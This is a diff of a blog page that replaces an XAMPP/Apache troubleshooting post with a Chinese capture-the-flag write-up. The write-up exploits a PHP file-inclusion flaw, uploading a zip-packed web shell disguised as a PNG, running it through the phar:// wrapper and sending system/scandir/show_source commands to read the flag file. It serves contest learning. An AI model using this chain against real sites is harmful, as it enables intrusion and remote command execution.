@@ -4,25 +4,25 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>XAMPP Apache shutdown unexpectedly问题解决 | GetFlag&#39;s Blog</title>
+    <title>中孚杯铜牌 LFI | GetFlag&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="GetFlag">
     
 
     
-    <meta name="description" content="在上软件测试课时，使用XAMPP搭建testlink过程中出现了apache服务器启动不了的问题，上课时在本机并没有解决，临时用的phpstudy搭建环境安装，课后研究发现问题。">
-<meta name="keywords" content="XAMPP,error">
+    <meta name="description" content="当时这道题并没有做出来，也并没有意识到会是文件包含，去年参加比赛的时候，太萌新了，机缘巧合遇到出题人才想起来再次去看这道题。 考点为php伪协议文件包含 首先点击上传文件，上传后发现，url变成了 1http://40.125.170.89:8007/index.php?poj=show&amp;amp;imageid=925cb008b81193fb099183c40091de07677ac5c6 尝试">
+<meta name="keywords" content="中孚杯,山东省大学生信息安全竞赛">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XAMPP Apache shutdown unexpectedly问题解决">
-<meta property="og:url" content="http://flag0.com/2018/02/27/AXMPP安装问题解决/index.html">
+<meta property="og:title" content="中孚杯铜牌 LFI">
+<meta property="og:url" content="http://flag0.com/2018/08/15/中孚杯铜牌LFI/index.html">
 <meta property="og:site_name" content="GetFlag&#39;s Blog">
-<meta property="og:description" content="在上软件测试课时，使用XAMPP搭建testlink过程中出现了apache服务器启动不了的问题，上课时在本机并没有解决，临时用的phpstudy搭建环境安装，课后研究发现问题。">
+<meta property="og:description" content="当时这道题并没有做出来，也并没有意识到会是文件包含，去年参加比赛的时候，太萌新了，机缘巧合遇到出题人才想起来再次去看这道题。 考点为php伪协议文件包含 首先点击上传文件，上传后发现，url变成了 1http://40.125.170.89:8007/index.php?poj=show&amp;amp;imageid=925cb008b81193fb099183c40091de07677ac5c6 尝试">
 <meta property="og:locale" content="cn-zh">
-<meta property="og:updated_time" content="2018-03-19T08:39:00.154Z">
+<meta property="og:updated_time" content="2018-08-15T13:34:33.233Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XAMPP Apache shutdown unexpectedly问题解决">
-<meta name="twitter:description" content="在上软件测试课时，使用XAMPP搭建testlink过程中出现了apache服务器启动不了的问题，上课时在本机并没有解决，临时用的phpstudy搭建环境安装，课后研究发现问题。">
+<meta name="twitter:title" content="中孚杯铜牌 LFI">
+<meta name="twitter:description" content="当时这道题并没有做出来，也并没有意识到会是文件包含，去年参加比赛的时候，太萌新了，机缘巧合遇到出题人才想起来再次去看这道题。 考点为php伪协议文件包含 首先点击上传文件，上传后发现，url变成了 1http://40.125.170.89:8007/index.php?poj=show&amp;amp;imageid=925cb008b81193fb099183c40091de07677ac5c6 尝试">
 
     
     <link rel="alternative" href="/atom.xml" title="GetFlag&#39;s Blog" type="application/atom+xml">
@@ -78,14 +78,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/02/27/AXMPP安装问题解决/" title="XAMPP Apache shutdown unexpectedly问题解决" itemprop="url">XAMPP Apache shutdown unexpectedly问题解决</a>
+      <a href="/2018/08/15/中孚杯铜牌LFI/" title="中孚杯铜牌 LFI" itemprop="url">中孚杯铜牌 LFI</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-02-27T15:00:03.000Z" itemprop="datePublished"> Published 2018-02-27</time>
+    <time datetime="2018-08-15T14:00:03.000Z" itemprop="datePublished"> Published 2018-08-15</time>
     
   </p>
 </header>
@@ -94,61 +94,44 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-报错信息"><span class="toc-number">1.</span> <span class="toc-text">0x01: 报错信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-端口冲突"><span class="toc-number">2.</span> <span class="toc-text">0x02: 端口冲突</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-服务冲突"><span class="toc-number">3.</span> <span class="toc-text">0x03: 服务冲突</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Warning-strftime-未设置时区"><span class="toc-number">4.</span> <span class="toc-text">0x04: Warning: strftime() 未设置时区</span></a></li></ol>
+			
 		
 		</div>
 		
-		<p>在上软件测试课时，使用XAMPP搭建testlink过程中出现了apache服务器启动不了的问题，上课时在本机并没有解决，临时用的phpstudy搭建环境安装，课后研究发现问题。<br><a id="more"></a></p>
-<h2 id="0x01-报错信息"><a href="#0x01-报错信息" class="headerlink" title="0x01: 报错信息"></a>0x01: 报错信息</h2><pre><code>20:20:57  [Apache]     Error: Apache shutdown unexpectedly.
-20:20:57  [Apache]     This may be due to a blocked port, missing dependencies, 
-20:20:57  [Apache]     improper privileges, a crash, or a shutdown by another method.
-20:20:57  [Apache]     Check the &quot;/xampp/apache/logs/error.log&quot; file
-20:20:57  [Apache]     and the Windows Event Viewer for more 
-</code></pre><h2 id="0x02-端口冲突"><a href="#0x02-端口冲突" class="headerlink" title="0x02: 端口冲突"></a>0x02: 端口冲突</h2><p>搜索后，网上大多都说是端口冲突，遂更改端口。</p>
-<pre><code>点击apache右面的Config按钮，打开httpd.conf 找到Listen 80修改为其他未被占用的端口
-</code></pre><p>结果，修改为了8080，8081，8000…(emmmmmm)等确定不会被占用的端口后仍然出现该错误提示。</p>
-<h2 id="0x03-服务冲突"><a href="#0x03-服务冲突" class="headerlink" title="0x03: 服务冲突"></a>0x03: 服务冲突</h2><p>后来由同学提醒发现了和Vmware存在冲突<br>课后仔细研究发现，</p>
-<pre><code>C:\Users\KEY&gt;netstat -aon|findstr &quot;443&quot;
-TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       7460
-TCP    10.232.216.11:52933    106.11.62.15:443       ESTABLISHED     9696
-TCP    10.232.216.11:62465    52.230.84.217:443      ESTABLISHED     4464
-TCP    [::]:443               [::]:0                 LISTENING       7460
-</code></pre><p>VMware占用了443端口</p>
-<blockquote>
-<p>VMware中的Shared VMs占用了443端口，Shared VMs是用于远程连接服务器，注册、管理虚拟机用的，也就是可以用vmware作为虚拟机服务器。对一般同学来说用处不大，可以直接禁用掉这个功能。</p>
-</blockquote>
-<p>解决方法：<br>1.直接禁用掉VMware中的Shared VMs功能</p>
-<pre><code>编辑-&gt;首选项-&gt;共享虚拟机-&gt;禁用共享
-</code></pre><p>2.在服务中禁用掉VMeare Workstation Serveice服务<br>3.修改httpd-ssl.conf中的443端口为其他数字</p>
-<pre><code>点击apache右面的Config按钮，打开httpd-ssl.conf 找到Listen 443修改为其他未被占用的端口,例如442等
-</code></pre><p>修改后再次问题解决，点击Start，成功启动。<br>apache服务器启动起来了，问题并没有完全解决。</p>
-<h2 id="0x04-Warning-strftime-未设置时区"><a href="#0x04-Warning-strftime-未设置时区" class="headerlink" title="0x04: Warning: strftime() 未设置时区"></a>0x04: Warning: strftime() 未设置时区</h2><p>安装完成后，页面未能正常显示，出现了php错误代码</p>
-<pre><code>Warning: strftime(): It is not safe to rely on the system&apos;s timezone settings. You are 
-*required* to use the date.timezone setting or the date_default_timezone_set() function. 
-In case you used any of those methods and you are still getting this warning, you most 
-likely misspelled the timezone identifier. We selected the timezone &apos;UTC&apos; for now, but 
-please set date.timezone to select your timezone. in 
-C:\Apache24\htdocs\testlink\config.inc.php on line 781
-</code></pre><p>根据错误信息翻译得</p>
-<pre><code>依靠系统的时区设置是不安全的。你*需要*使用date.timezone设置或date_default_timezone_set()功能。
-如果你用那些方法，你仍然得到这样的警告，你最有可能拼错的时区标识符。我们选择的时区的UTC的现在，
-但请date.timezone选择您的时区。
-</code></pre><p>php.ini中设置时区解决问题</p>
-<pre><code>打开php.ini找到date.timezone = &quot;&quot; 如有去掉前面的分号,并将&quot;&quot;内改为Asia/Shanghai 
-</code></pre>  
+		<p>当时这道题并没有做出来，也并没有意识到会是文件包含，去年参加比赛的时候，太萌新了，机缘巧合遇到出题人才想起来再次去看这道题。</p>
+<p>考点为php伪协议文件包含<br><--more--></--more--></p>
+<p>首先点击上传文件，上传后发现，url变成了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://40.125.170.89:8007/index.php?poj=show&amp;imageid=925cb008b81193fb099183c40091de07677ac5c6</span><br></pre></td></tr></table></figure>
+<p>尝试将show替换为index，发现被成功包含执行，判定此处存在文件包含漏洞，但是拼接了<code>.php</code></p>
+<p>此时采用<code>phar</code>协议或者<code>zip</code>协议绕过</p>
+<p>然后将一句话木马压缩成zip格式的压缩包，然后将拓展名改为png，上传，并使用phar协议执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://40.125.170.89:8007/index.php?poj=phar://uploads/775edc76cc887daa1b6c3423c33f7aa3d1ac76db.png/a</span><br></pre></td></tr></table></figure>
+<p>尝试<code>system</code>发现可以使用，于是直接POST传值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+<p>列出当前目录，发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">css function.php index.php show.php tHe_flAg_1s_Here.php upload.php uploads</span><br></pre></td></tr></table></figure>
+<p>直接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;cat tHe_flAg_1s_Here.php&quot;);</span><br></pre></td></tr></table></figure>
+<p>右击查看源代码即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag is here</span><br><span class="line">&lt;?php</span><br><span class="line">//flag&#123;yjnfrtgertyhrtyjnbvf1sn0Tifbgt&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>如果<code>system</code>函数被禁用，则可以尝试<code>scandir</code>函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=print_r(scandir(&quot;.&quot;));//列出当前目录下的所有文件</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; css [3] =&gt; function.php [4] =&gt; index.php [5] =&gt; show.php [6] =&gt; tHe_flAg_1s_Here.php [7] =&gt; upload.php [8] =&gt; uploads )</span><br></pre></td></tr></table></figure>
+<p>使用<code>show_source</code>函数，查看文件内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=show_source(&apos;tHe_flAg_1s_Here.php&apos;);</span><br></pre></td></tr></table></figure>  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/编程开发/">编程开发</a>
+  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/XAMPP/">XAMPP</a><a href="/tags/error/">error</a>
+  <span></span> <a href="/tags/中孚杯/">中孚杯</a><a href="/tags/山东省大学生信息安全竞赛/">山东省大学生信息安全竞赛</a>
   </div>
 
 </div>
@@ -157,7 +140,7 @@ C:\Apache24\htdocs\testlink\config.inc.php on line 781
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://flag0.com/2018/02/27/AXMPP安装问题解决/" data-title="XAMPP Apache shutdown unexpectedly问题解决 | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
+	  <div data-url="http://flag0.com/2018/08/15/中孚杯铜牌LFI/" data-title="中孚杯铜牌 LFI | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -170,19 +153,11 @@ C:\Apache24\htdocs\testlink\config.inc.php on line 781
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2018/03/12/PHP-PDO技术/" title="PHP PDO学习笔记">
-  <strong>上一篇：</strong><br/>
-  <span>
-  PHP PDO学习笔记</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2018/02/27/docker环境使用笔记/"  title="docker 环境使用笔记">
+<a href="/2018/08/12/xman2018个人排位赛Web-MISCWriteup/"  title="Xman2018排位赛 Web、MISC Writeup">
  <strong>下一篇：</strong><br/> 
- <span>docker 环境使用笔记
+ <span>Xman2018排位赛 Web、MISC Writeup
 </span>
 </a>
 </div>
@@ -199,7 +174,7 @@ C:\Apache24\htdocs\testlink\config.inc.php on line 781
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
  
- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-报错信息"><span class="toc-number">1.</span> <span class="toc-text">0x01: 报错信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-端口冲突"><span class="toc-number">2.</span> <span class="toc-text">0x02: 端口冲突</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-服务冲突"><span class="toc-number">3.</span> <span class="toc-text">0x03: 服务冲突</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Warning-strftime-未设置时区"><span class="toc-number">4.</span> <span class="toc-text">0x04: Warning: strftime() 未设置时区</span></a></li></ol>
+ 
  
   </div>
 
